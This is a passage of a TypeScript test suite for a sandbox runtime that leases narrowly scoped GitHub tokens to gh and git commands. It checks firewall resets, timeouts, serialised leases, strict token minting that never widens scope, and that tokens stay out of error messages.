    const placeholders = new Set<string>();
    for (let index = 0; index < 5; index += 1) {
      placeholders.add(
        await withShellLease(
          sandbox,
          { mint },
          async (lease) => lease.placeholder
        )
      );
    }
    expect(placeholders.size).toBe(5);
  });
});

describe("ending a lease: the credential comes off the firewall, or the caller hears about it", () => {
  const RESET_FAILED =
    "The command finished, but its GitHub credential could not be taken off the sandbox's network policy.";
  const fetchOf = (...args: string[]) => {
    const parsed = parseGitFetch(args);
    if (!parsed.ok) {
      throw new Error(parsed.reason);
    }
    return parsed.commandLine;
  };

  /** Every way a lease is held, each returning something a test can check. */
  const LEASES: [
    name: string,
    run: (
      sandbox: LeaseSandbox,
      dependencies: LeaseDependencies
    ) => Promise<unknown>,
    expected: unknown,
  ][] = [
    [
      "runGh",
      (sandbox, dependencies) =>
        runGh(sandbox, gh("issue", "view", "12"), "repo-read", dependencies),
      { exitCode: 0, stderr: "", stdout: "done", truncated: false },
    ],
    [
      "runGitPush",
      (sandbox, dependencies) => runGitPush(sandbox, "factory/x", dependencies),
      { exitCode: 0, stderr: "", stdout: "done", truncated: false },
    ],
    [
      "runGitFetch",
      (sandbox, dependencies) =>
        runGitFetch(sandbox, fetchOf("origin", "main"), dependencies),
      { exitCode: 0, stderr: "", stdout: "done", truncated: false },
    ],
    [
      "runLeasedGitCommand",
      (sandbox, dependencies) =>
        runLeasedGitCommand(sandbox, "/usr/bin/git clone x", dependencies),
      { exitCode: 0, stderr: "", stdout: "done", truncated: false },
    ],
    [
      "withShellLease",
      (sandbox, dependencies) =>
        withShellLease(
          sandbox,
          dependencies,
          async () => "what the shell said"
        ),
      "what the shell said",
    ],
  ];

  const resetsOf = (steps: readonly Step[]) =>
    steps.filter(
      (step) => step.kind === "policy" && step.policy === "allow-all"
    );

  test("the reset is tried three times", () => {
    expect(LEASE_RESET_ATTEMPTS).toBe(3);
  });

  describe.each(LEASES)("%s", (_name, run, expected) => {
    test.each([1, 2])(
      "a reset that fails %i time(s) and then works leaves the lease ended and the result returned",
      async (failures) => {
        const { sandbox, steps } = fakeSandbox(() => ({ stdout: "done" }), {
          resetFailures: failures,
        });
        const { mint } = mintOk();
        expect(await run(sandbox, { mint })).toEqual(expected);
        // One try per failure, and the one that worked; nothing after it.
        expect(resetsOf(steps)).toHaveLength(failures + 1);
        expect(steps.slice(-(failures + 1))).toEqual(
          new Array(failures + 1).fill({ kind: "policy", policy: "allow-all" })
        );
        // The credential went on once.
        expect(steps.filter((step) => step.kind === "policy")).toHaveLength(
          failures + 2
        );
      }
    );

    test("a reset that fails three times throws, with the last failure as its cause, and is not tried a fourth time", async () => {
      const { sandbox, steps } = fakeSandbox(() => ({ stdout: "done" }), {
        resetFailures: 3,
      });
      const { mint } = mintOk();
      const error: unknown = await run(sandbox, { mint }).then(
        () => "no error",
        (thrown: unknown) => thrown
      );
      expect(error).toBeInstanceOf(Error);
      expect((error as Error).message).toBe(RESET_FAILED);
      expect((error as Error).cause).toEqual(
        new Error("sandbox API unavailable (reset 3)")
      );
      expect(resetsOf(steps)).toHaveLength(3);
    });

    test("the lease after one that could not be taken off still runs, and its own reset is what clears the firewall", async () => {
      const { sandbox, steps } = fakeSandbox(() => ({ stdout: "done" }), {
        resetFailures: 3,
      });
      const { mint } = mintOk();
      const first = run(sandbox, { mint });
      const second = run(sandbox, { mint });
      await expect(first).rejects.toThrow(RESET_FAILED);
      expect(await second).toEqual(expected);
      expect(steps.at(-1)).toEqual({ kind: "policy", policy: "allow-all" });
      expect(resetsOf(steps)).toHaveLength(4);
    });
  });

  test("the error says the command itself finished, and carries nothing of the token, even when the command printed it", async () => {
    const { sandbox } = fakeSandbox(
      () => ({ stderr: basic(TOKEN), stdout: TOKEN }),
      { resetFailures: LEASE_RESET_ATTEMPTS }
    );
    const { mint } = mintOk();
    const error: unknown = await runGh(
      sandbox,
      gh("issue", "view", "12"),
      "repo-read",
      { mint }
    ).then(
      () => "no error",
      (thrown: unknown) => thrown
    );
    expect(error).toBeInstanceOf(Error);
    const { cause, message } = error as Error;
    expect(message).toMatch(/^The command finished, but /);
    expect(cause).toBeInstanceOf(Error);
    for (const text of [message, String(cause), JSON.stringify(error)]) {
      expect(text).not.toContain(TOKEN);
      expect(text).not.toContain(basic(TOKEN));
    }
  });
});

describe("every command the runtime runs under a lease has a time limit", () => {
  const fetchOf = (...args: string[]) => {
    const parsed = parseGitFetch(args);
    if (!parsed.ok) {
      throw new Error(parsed.reason);
    }
    return parsed.commandLine;
  };

  test("the limits: a gh command, a push or fetch, and a first clone", () => {
    expect(GH_TIMEOUT_MS).toBe(90_000);
    expect(GIT_TIMEOUT_MS).toBe(110_000);
    expect(LEASED_GIT_TIMEOUT_MS).toBe(10 * 60 * 1000);
  });

  test.each<
    [
      string,
      (sandbox: LeaseSandbox, mint: TokenMinter) => Promise<unknown>,
      number,
    ]
  >([
    [
      "runGh",
      (sandbox, mint) =>
        runGh(sandbox, gh("issue", "view", "12"), "repo-read", { mint }),
      GH_TIMEOUT_MS,
    ],
    [
      "runGitPush",
      (sandbox, mint) => runGitPush(sandbox, "factory/x", { mint }),
      GIT_TIMEOUT_MS,
    ],
    [
      "runGitFetch",
      (sandbox, mint) =>
        runGitFetch(sandbox, fetchOf("origin", "main"), { mint }),
      GIT_TIMEOUT_MS,
    ],
    // A stalled clone or checkout would otherwise hold the lease, and with
    // it the sandbox's queue, for as long as the sandbox lives.
    [
      "runLeasedGitCommand",
      (sandbox, mint) =>
        runLeasedGitCommand(sandbox, "/usr/bin/git clone x", { mint }),
      LEASED_GIT_TIMEOUT_MS,
    ],
  ])(
    "%s hands the sandbox an abort signal that fires after its limit",
    async (_name, run, limit) => {
      const timeout = vi.spyOn(AbortSignal, "timeout");
      const { sandbox, signals } = fakeSandbox();
      const { mint } = mintOk();
      await run(sandbox, mint);
      expect(signals).toHaveLength(1);
      const [signal] = signals;
      expect(signal).toBeInstanceOf(AbortSignal);
      expect(signal?.aborted).toBe(false);
      expect(timeout).toHaveBeenCalledTimes(1);
      expect(timeout).toHaveBeenCalledWith(limit);
      expect(timeout.mock.results[0]?.value).toBe(signal);
    }
  );
});

describe("leases on one sandbox never overlap", () => {
  test("concurrent calls run one after another, each inside its own set/reset pair", async () => {
    const order: string[] = [];
    let release: (() => void) | undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sandbox: LeaseSandbox = {
      name: "sbx_shared",
      run: async ({ command }) => {
        order.push(`run:${command}`);
        if (command.includes("'1'")) {
          await gate;
        }
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        order.push(policy === "allow-all" ? "reset" : "lease");
      },
      writeTextFile: async () => undefined,
    };
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await Promise.resolve();
    await new Promise((resolve) => setImmediate(resolve));
    expect(order).toEqual(["lease", "run:/usr/bin/gh 'issue' 'view' '1'"]);
    release?.();
    await Promise.all([first, second]);
    expect(order).toEqual([
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '1'",
      "reset",
      "lease",
      "run:/usr/bin/gh 'issue' 'view' '2'",
      "reset",
    ]);
  });

  test("a failed lease does not block the next one", async () => {
    const { sandbox, steps } = fakeSandbox((command) => {
      if (command.includes("'1'")) {
        throw new Error("boom");
      }
      return { stdout: "ok" };
    });
    const { mint } = mintOk();
    const first = runGh(sandbox, gh("issue", "view", "1"), "repo-read", {
      mint,
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await expect(first).rejects.toThrow(/boom/);
    expect((await second).stdout).toBe("ok");
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(4);
  });

  /** A sandbox whose log says which lease is live when each thing happens. */
  const shared = () => {
    const order: string[] = [];
    const sandbox: LeaseSandbox = {
      name: "sbx_shared_shell",
      run: async ({ command }) => {
        // What the runtime wrote, after the guard its git commands start with.
        const written = command.startsWith(GUARD)
          ? command.slice(GUARD.length)
          : command;
        order.push(`run:${written.split(" ").slice(0, 3).join(" ")}`);
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        if (policy === "allow-all") {
          order.push("reset");
          return;
        }
        const hosts = Object.keys((policy as { allow: object }).allow);
        order.push(`lease:${hosts.length === 5 ? "shell" : "runner"}`);
      },
      writeTextFile: async () => undefined,
    };
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    return { gate, order, release, sandbox };
  };

  const tick = async () => {
    await Promise.resolve();
    await new Promise((resolve) => setImmediate(resolve));
  };

  test("a write waits for a shell lease on the same sandbox to end, so the shell never runs under a token that writes", async () => {
    const { gate, order, release, sandbox } = shared();
    const { mint, requests } = mintOk();
    const shell = withShellLease(sandbox, { mint }, async () => {
      order.push("shell:start");
      await gate;
      order.push("shell:end");
    });
    const write = runGh(
      sandbox,
      gh("issue", "edit", "12", "--add-label", "bug"),
      "repo-triage",
      { mint }
    );
    const push = runGitPush(sandbox, "factory/x", { mint });
    await tick();
    expect(order).toEqual(["lease:shell", "shell:start"]);
    // Neither token that writes has even been minted yet.
    expect(requests).toEqual([READ_PERMISSIONS]);
    release();
    await Promise.all([shell, write, push]);
    expect(order).toEqual([
      "lease:shell",
      "shell:start",
      "shell:end",
      "reset",
      "lease:runner",
      "run:/usr/bin/gh 'issue' 'edit'",
      "reset",
      "lease:runner",
      "run:/usr/bin/git -C '/workspace/repo'",
      "reset",
    ]);
    expect(requests.map((permissions) => permissions?.[0])).toEqual([
      "contents:read",
      "contents:read",
      "contents:write",
    ]);
  });

  test("a shell lease waits for a write on the same sandbox to end", async () => {
    const order: string[] = [];
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sandbox: LeaseSandbox = {
      name: "sbx_shared_write_first",
      run: async () => {
        order.push("push:start");
        await gate;
        order.push("push:end");
        return { exitCode: 0, stderr: "", stdout: "" };
      },
      setNetworkPolicy: async (policy) => {
        order.push(policy === "allow-all" ? "reset" : "lease");
      },
      writeTextFile: async () => undefined,
    };
    const { mint } = mintOk();
    const push = runGitPush(sandbox, "factory/x", { mint });
    const shell = withShellLease(sandbox, { mint }, async () => {
      order.push("shell");
    });
    await tick();
    expect(order).toEqual(["lease", "push:start"]);
    release();
    await Promise.all([push, shell]);
    expect(order).toEqual([
      "lease",
      "push:start",
      "push:end",
      "reset",
      "lease",
      "shell",
      "reset",
    ]);
  });

  test("a shell command that rejects does not block the next lease", async () => {
    const { sandbox, steps } = fakeSandbox(() => ({ stdout: "ok" }));
    const { mint } = mintOk();
    const first = withShellLease(sandbox, { mint }, async () => {
      throw new Error("boom");
    });
    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await expect(first).rejects.toThrow(/boom/);
    expect((await second).stdout).toBe("ok");
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(4);
  });

  test("leases on different sandboxes do not wait for each other", async () => {
    const order: string[] = [];
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const { mint } = mintOk();
    const blocked = withShellLease(
      { name: "sbx_a", setNetworkPolicy: async () => undefined },
      { mint },
      async () => {
        await gate;
        order.push("a");
      }
    );
    await withShellLease(
      { name: "sbx_b", setNetworkPolicy: async () => undefined },
      { mint },
      async () => {
        order.push("b");
      }
    );
    expect(order).toEqual(["b"]);
    release();
    await blocked;
    expect(order).toEqual(["b", "a"]);
  });
});

describe("token scopes", () => {
  test("no scope except repo-push can write repository contents, and none can change workflows by default", () => {
    for (const scope of ["repo-read", "repo-triage", "repo-push"] as const) {
      const { optional, required } = permissionsFor(scope);
      const all = [...required, ...optional];
      expect(all).not.toContain("workflows:write");
      expect(all).not.toContain("administration:write");
      if (scope !== "repo-push") {
        expect(all).not.toContain("contents:write");
      }
    }
    expect(TOKEN_SCOPES["repo-triage"].required).toEqual([
      "contents:read",
      "issues:write",
      "pull_requests:write",
    ]);
    expect(
      TOKEN_SCOPES["repo-read"].required.every((entry) =>
        entry.endsWith(":read")
      )
    ).toBe(true);
  });

  test("workflow changes are an explicit opt-in on the push scope only", () => {
    vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "1");
    expect(permissionsFor("repo-push")).toEqual({
      optional: ["workflows:write"],
      required: ["contents:write"],
    });
    expect(permissionsFor("repo-read")).toBe(TOKEN_SCOPES["repo-read"]);
    expect(permissionsFor("repo-triage")).toBe(TOKEN_SCOPES["repo-triage"]);
  });

  test("the widest set the installation grants is requested first, and remembered", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    };
    await mintScopedToken("repo-triage", { mint });
    await mintScopedToken("repo-triage", { mint });
    const full = [
      ...TOKEN_SCOPES["repo-triage"].required,
      ...TOKEN_SCOPES["repo-triage"].optional,
    ];
    expect(requests).toEqual([full, full]);
  });

  test("an installation without the optional permissions gets the required set", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (permissions?.includes("checks:read")) {
        throw new Error("422: permissions not granted to this installation");
      }
      return TOKEN;
    };
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
    await mintScopedToken("repo-read", { mint });
    expect(requests).toHaveLength(3);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });

  test("by default a scope never widens: when narrowing is refused the command fails, whatever the error", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    for (const failure of [
      "422: permissions not granted",
      "ETIMEDOUT",
      "500 Internal Server Error",
    ]) {
      resetTokenScopeMemo();
      const requests: (readonly string[] | null)[] = [];
      await expect(
        mintScopedToken("repo-read", {
          installationToken: async () => {
            installationCalls += 1;
            return "FULL-INSTALLATION-TOKEN";
          },
          mint: async (permissions) => {
            requests.push(permissions);
            throw new Error(failure);
          },
        })
      ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-read"/);
      expect(requests).toHaveLength(2);
      expect(requests).not.toContain(null);
    }
    expect(installationCalls).toBe(0);
    expect(warn).not.toHaveBeenCalled();
  });

  test("a strict mint never takes a wider rung, whatever the setting, and its failure is a NarrowTokenError", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    for (const setting of ["", "repository", "installation"]) {
      for (const scope of ["repo-read", "repo-triage", "repo-push"] as const) {
        resetTokenScopeMemo();
        vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
        const requests: (readonly string[] | null)[] = [];
        let installationCalls = 0;
        await expect(
          mintScopedToken(
            scope,
            {
              installationToken: async () => {
                installationCalls += 1;
                return "FULL-INSTALLATION-TOKEN";
              },
              mint: async (permissions) => {
                requests.push(permissions);
                if (permissions !== null) {
                  throw new Error("422: cannot narrow");
                }
                return "WIDE-REPOSITORY-TOKEN";
              },
            },
            { strict: true }
          )
        ).rejects.toBeInstanceOf(NarrowTokenError);
        expect(requests).not.toContain(null);
        expect(requests.length).toBeGreaterThan(0);
        expect(installationCalls).toBe(0);
      }
    }
    expect(warn).not.toHaveBeenCalled();
  });

  test("a strict mint takes a narrow token like any other", async () => {
    const { mint, requests } = mintOk();
    expect(await mintScopedToken("repo-read", { mint }, { strict: true })).toBe(
      TOKEN
    );
    expect(requests).toEqual([READ_PERMISSIONS]);
  });
});

/*
 * A strict mint is for a credential a shell command will hold, where the
 * scope is the only limit there is. It keeps its own counsel: it neither
 * reads nor writes what the other mints remember, walks the scope's own
 * rungs every time, and remembers only that it was refused, briefly.
 */
describe("strict minting", () => {
  const SCOPES = ["repo-read", "repo-triage", "repo-push"] as const;
  const rungsOf = (scope: TokenScope): (readonly string[])[] => {
    const { optional, required } = TOKEN_SCOPES[scope];
    return optional.length > 0
      ? [[...required, ...optional], required]
      : [required];
  };

  /**
   * A connector whose behaviour a test can change as it goes: which
   * permission sets it mints, at what time, counting every request.
   */
  const connector = (
    grants: (permissions: readonly string[] | null) => boolean
  ) => {
    const state = { clock: 5_000_000, grants, installationCalls: 0 };
    const requests: (readonly string[] | null)[] = [];
    const dependencies = {
      installationToken: async () => {
        state.installationCalls += 1;
        return "ghs_INSTALLATION_TOKEN";
      },
      mint: (async (permissions) => {
        requests.push(permissions);
        if (!state.grants(permissions)) {
          throw new Error("422: the installation refused these permissions");
        }
        return permissions === null
          ? "ghs_WIDE_REPOSITORY_TOKEN"
          : `ghs_narrow_${permissions.length}`;
      }) satisfies TokenMinter,
      now: () => state.clock,
    };
    const strict = (scope: TokenScope) =>
      mintScopedToken(scope, dependencies, { strict: true });
    const lenient = (scope: TokenScope) => mintScopedToken(scope, dependencies);
    return { dependencies, lenient, requests, state, strict };
  };
  const wideOnly = (permissions: readonly string[] | null) =>
    permissions === null;
  const nothing = () => false;
  const everything = () => true;
  const withoutOptional = (permissions: readonly string[] | null) =>
    permissions !== null && !permissions.includes("checks:read");

  beforeEach(() => {
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
  });

  test("the refusal is remembered for a minute", () => {
    expect(STRICT_REFUSAL_TTL_MS).toBe(60_000);
    // Much shorter than the other memo, so one blip does not cost a
    // deployment its shell credential for long.
    expect(STRICT_REFUSAL_TTL_MS).toBeLessThan(SCOPE_DOWNGRADE_TTL_MS);
  });

  describe("is independent of what the other mints remember", () => {
    test.each(["repository", "installation"])(
      "a wide token remembered for the runner (FACTORY_TOKEN_FALLBACK=%s) is not consulted: the strict mint asks for the scope's own rungs and takes the narrow token it is given",
      async (setting) => {
        vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
        const app = connector(setting === "repository" ? wideOnly : nothing);
        // The runner ends up on the widest rung the setting allows.
        expect(await app.lenient("repo-read")).toBe(
          setting === "repository"
            ? "ghs_WIDE_REPOSITORY_TOKEN"
            : "ghs_INSTALLATION_TOKEN"
        );
        const asked = app.requests.length;
        const { installationCalls } = app.state;

        // The connector narrows after all (the refusals were a blip).
        app.state.grants = everything;
        expect(await app.strict("repo-read")).toBe(
          `ghs_narrow_${READ_PERMISSIONS.length}`
        );
        expect(app.requests.slice(asked)).toEqual([READ_PERMISSIONS]);
        expect(app.state.installationCalls).toBe(installationCalls);

        // And the runner's memory is as it was: it goes straight back to
        // the rung it remembered, not to the one the strict mint found.
        const before = app.requests.length;
        await app.lenient("repo-read");
        expect(app.requests.slice(before)).toEqual(
          setting === "repository" ? [null] : []
        );
        expect(app.state.installationCalls).toBe(
          setting === "repository" ? installationCalls : installationCalls + 1
        );
      }
    );

    test("a wide token remembered for the runner does not stand in when the scope's own rungs are refused", async () => {
      vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
      const app = connector(wideOnly);
      await app.lenient("repo-read");
      const asked = app.requests.length;
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      expect(app.requests.slice(asked)).toEqual(rungsOf("repo-read"));
    });

    test("a lower rung remembered for the runner is not where a strict mint starts: it asks from the top", async () => {
      const app = connector(withoutOptional);
      expect(await app.lenient("repo-read")).toBe("ghs_narrow_3");
      // Remembered: the runner asks for the required set alone from now on.
      const asked = app.requests.length;
      await app.lenient("repo-read");
      expect(app.requests.slice(asked)).toEqual([
        TOKEN_SCOPES["repo-read"].required,
      ]);

      const before = app.requests.length;
      expect(await app.strict("repo-read")).toBe("ghs_narrow_3");
      expect(app.requests.slice(before)).toEqual(rungsOf("repo-read"));
    });

    test("a strict mint that succeeds writes nothing the other mints read", async () => {
      const app = connector(withoutOptional);
      expect(await app.strict("repo-read")).toBe("ghs_narrow_3");
      expect(app.requests).toEqual(rungsOf("repo-read"));
      // Had it been remembered, this would ask for the required set alone.
      const asked = app.requests.length;
      await app.lenient("repo-read");
      expect(app.requests.slice(asked)).toEqual(rungsOf("repo-read"));
      // And a strict mint remembers no rung of its own either.
      const before = app.requests.length;
      await app.strict("repo-read");
      expect(app.requests.slice(before)).toEqual(rungsOf("repo-read"));
    });

    test.each(["", "repository", "installation"])(
      "a strict refusal does not stop the runner (FACTORY_TOKEN_FALLBACK=%j): it walks its own ladder as if nothing had happened",
      async (setting) => {
        vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
        const app = connector(wideOnly);
        await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
          NarrowTokenError
        );
        expect(app.requests).toEqual(rungsOf("repo-read"));

        const asked = app.requests.length;
        const attempt = app.lenient("repo-read");
        if (setting === "") {
          await expect(attempt).rejects.toBeInstanceOf(NarrowTokenError);
          expect(app.requests.slice(asked)).toEqual(rungsOf("repo-read"));
        } else {
          expect(await attempt).toBe("ghs_WIDE_REPOSITORY_TOKEN");
          expect(app.requests.slice(asked)).toEqual([
            ...rungsOf("repo-read"),
            null,
          ]);
        }
      }
    );
  });

  describe("never returns a token wider than the scope", () => {
    test.each(SCOPES)(
      "%s: with every setting and every memory the runner can have, the minter is never asked for the app's full permissions and the installation token is never fetched",
      async (scope) => {
        for (const setting of ["", "repository", "installation"]) {
          for (const primed of [false, true]) {
            resetTokenScopeMemo();
            vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
            const app = connector(
              setting === "installation" ? nothing : wideOnly
            );
            if (primed) {
              // Leaves whatever the setting allows in the runner's memory.
              await app.lenient(scope).catch(() => undefined);
            }
            const asked = app.requests.length;
            const { installationCalls } = app.state;
            const attempt = app.strict(scope);
            await expect(attempt).rejects.toBeInstanceOf(NarrowTokenError);
            await expect(attempt).rejects.toThrow(
              `Could not mint a GitHub token for scope "${scope}" with permissions [${TOKEN_SCOPES[scope].required.join(", ")}].`
            );
            expect(app.requests.slice(asked)).toEqual(rungsOf(scope));
            expect(app.state.installationCalls).toBe(installationCalls);
          }
        }
      }
    );

    test("the token it does return is the one minted for the first of the scope's rungs that is granted", async () => {
      const full = connector(everything);
      expect(await full.strict("repo-read")).toBe(
        `ghs_narrow_${READ_PERMISSIONS.length}`
      );
      const required = connector(withoutOptional);
      expect(await required.strict("repo-triage")).toBe("ghs_narrow_3");
      expect(required.requests).toEqual(rungsOf("repo-triage"));
      const push = connector(everything);
      expect(await push.strict("repo-push")).toBe("ghs_narrow_1");
      expect(push.requests).toEqual([["contents:write"]]);
    });

    test("an empty token is a refusal, not a credential", async () => {
      const requests: (readonly string[] | null)[] = [];
      await expect(
        mintScopedToken(
          "repo-read",
          {
            mint: async (permissions) => {
              requests.push(permissions);
              return "";
            },
          },
          { strict: true }
        )
      ).rejects.toBeInstanceOf(NarrowTokenError);
      expect(requests).toEqual(rungsOf("repo-read"));
    });

    test("the refusal carries the connector's last error as its cause", async () => {
      const app = connector(nothing);
      const error: unknown = await app
        .strict("repo-read")
        .catch((thrown) => thrown);
      expect(error).toBeInstanceOf(NarrowTokenError);
      expect((error as Error).cause).toEqual(
        new Error("422: the installation refused these permissions")
      );
    });
  });

  describe("remembers a refusal for STRICT_REFUSAL_TTL_MS, and no longer", () => {
    test("while it is remembered the minter is not called again; once it has passed, it is", async () => {
      const app = connector(nothing);
      const start = app.state.clock;
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      expect(app.requests).toEqual(rungsOf("repo-read"));

      // Straight away, half-way, and one millisecond before the end.
      for (const elapsed of [0, 30_000, STRICT_REFUSAL_TTL_MS - 1]) {
        app.state.clock = start + elapsed;
        const attempt = app.strict("repo-read");
        await expect(attempt).rejects.toBeInstanceOf(NarrowTokenError);
        await expect(attempt).rejects.toThrow(
          /Could not mint a GitHub token for scope "repo-read"/
        );
      }
      expect(app.requests).toEqual(rungsOf("repo-read"));

      app.state.clock = start + STRICT_REFUSAL_TTL_MS;
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      expect(app.requests).toEqual([
        ...rungsOf("repo-read"),
        ...rungsOf("repo-read"),
      ]);
    });

    test("a refusal remembered at the second failure lasts a minute from then, not from the first", async () => {
      const app = connector(nothing);
      const start = app.state.clock;
      await app.strict("repo-read").catch(() => undefined);
      app.state.clock = start + STRICT_REFUSAL_TTL_MS;
      await app.strict("repo-read").catch(() => undefined);
      const asked = app.requests.length;
      app.state.clock = start + 2 * STRICT_REFUSAL_TTL_MS - 1;
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      expect(app.requests).toHaveLength(asked);
    });

    test("a connector that narrows again is found out when the minute is up, and not before", async () => {
      const app = connector(nothing);
      const start = app.state.clock;
      await app.strict("repo-read").catch(() => undefined);
      app.state.grants = everything;

      app.state.clock = start + STRICT_REFUSAL_TTL_MS - 1;
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      app.state.clock = start + STRICT_REFUSAL_TTL_MS;
      expect(await app.strict("repo-read")).toBe(
        `ghs_narrow_${READ_PERMISSIONS.length}`
      );
      // And from then on every strict mint asks, and is answered.
      expect(await app.strict("repo-read")).toBe(
        `ghs_narrow_${READ_PERMISSIONS.length}`
      );
      expect(app.requests).toEqual([
        ...rungsOf("repo-read"),
        READ_PERMISSIONS,
        READ_PERMISSIONS,
      ]);
    });

    test("the refusal is kept per scope", async () => {
      const app = connector(
        (permissions) => permissions?.includes("contents:write") ?? false
      );
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      const asked = app.requests.length;
      expect(await app.strict("repo-push")).toBe("ghs_narrow_1");
      expect(app.requests.slice(asked)).toEqual([["contents:write"]]);
    });

    test("it stops strict mints only: the runner still asks the connector meanwhile", async () => {
      const app = connector(nothing);
      await app.strict("repo-read").catch(() => undefined);
      app.state.grants = everything;
      const asked = app.requests.length;
      expect(await app.lenient("repo-read")).toBe(
        `ghs_narrow_${READ_PERMISSIONS.length}`
      );
      expect(app.requests.slice(asked)).toEqual([READ_PERMISSIONS]);
      // The runner's success does not lift the strict refusal either.
      await expect(app.strict("repo-read")).rejects.toBeInstanceOf(
        NarrowTokenError
      );
      expect(app.requests).toHaveLength(asked + 1);
    });

    test("resetTokenScopeMemo forgets the refusal, so the next strict mint asks at once", async () => {
      const app = connector(nothing);
      await app.strict("repo-read").catch(() => undefined);
      const asked = app.requests.length;
      await app.strict("repo-read").catch(() => undefined);
      expect(app.requests).toHaveLength(asked);

      resetTokenScopeMemo();
      app.state.grants = everything;
      expect(await app.strict("repo-read")).toBe(
        `ghs_narrow_${READ_PERMISSIONS.length}`
      );
      expect(app.requests.slice(asked)).toEqual([READ_PERMISSIONS]);
    });

    test("resetTokenScopeMemo forgets what the runner remembered as well", async () => {
      const app = connector(withoutOptional);
      await app.lenient("repo-read");
      resetTokenScopeMemo();
      const asked = app.requests.length;
      await app.lenient("repo-read");
      expect(app.requests.slice(asked)).toEqual(rungsOf("repo-read"));
    });
  });

  test("withShellLease mints strictly: a shell command waits out the same minute, with no policy set and the command never started", async () => {
    const app = connector(nothing);
    const { sandbox, steps } = fakeSandbox();
    let started = 0;
    const attempt = () =>
      withShellLease(sandbox, app.dependencies, async () => {
        started += 1;
        return "ran";
      });
    await expect(attempt()).rejects.toBeInstanceOf(NarrowTokenError);
    app.state.grants = everything;
    app.state.clock += STRICT_REFUSAL_TTL_MS - 1;
    await expect(attempt()).rejects.toBeInstanceOf(NarrowTokenError);
    expect(app.requests).toEqual(rungsOf("repo-read"));
    expect(started).toBe(0);
    expect(steps).toEqual([]);

    app.state.clock += 1;
    expect(await attempt()).toBe("ran");
    expect(started).toBe(1);
    expect(app.requests).toEqual([...rungsOf("repo-read"), READ_PERMISSIONS]);
  });
});

describe("token scopes: failures and fallbacks", () => {
  test("the failure names the permissions to check and the setting that would allow a wider token", async () => {
    await expect(
      mintScopedToken("repo-triage", {
        mint: async () => {
          throw new Error("refused");
        },
      })
    ).rejects.toThrow(
      /contents:read, issues:write, pull_requests:write.*FACTORY_TOKEN_FALLBACK=repository/s
    );
  });

  test("FACTORY_TOKEN_FALLBACK=repository allows the app's permissions on the factory repository, and says so", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    const requests: (readonly string[] | null)[] = [];
    const token = await mintScopedToken("repo-triage", {
      installationToken: async () => {
        installationCalls += 1;
        return "FULL";
      },
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null) {
          throw new Error("unsupported");
        }
        return TOKEN;
      },
    });
    expect(token).toBe(TOKEN);
    expect(requests.at(-1)).toBeNull();
    expect(installationCalls).toBe(0);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0]?.[0])).toMatch(/could not be narrowed/);
  });

  test("an empty token is treated as a failure, not as a credential", async () => {
    await expect(
      mintScopedToken("repo-read", { mint: async () => "" })
    ).rejects.toThrow(/Could not mint a GitHub token/);
  });

  test("a remembered rung that stops working is forgotten, and the ladder is walked again", async () => {
    const installation: { grantsChecks: boolean } = { grantsChecks: true };
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (!installation.grantsChecks && permissions?.includes("checks:read")) {
        throw new Error("422: permission removed");
      }
      return TOKEN;
    };
    await mintScopedToken("repo-read", { mint });
    installation.grantsChecks = false;
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });
});

/**
 * A read that had to take a wider token (`FACTORY_TOKEN_FALLBACK`) may run
 * in a station's sandbox, where the placeholder can be read by whatever
 * else is running. The firewall then attaches the token only to the
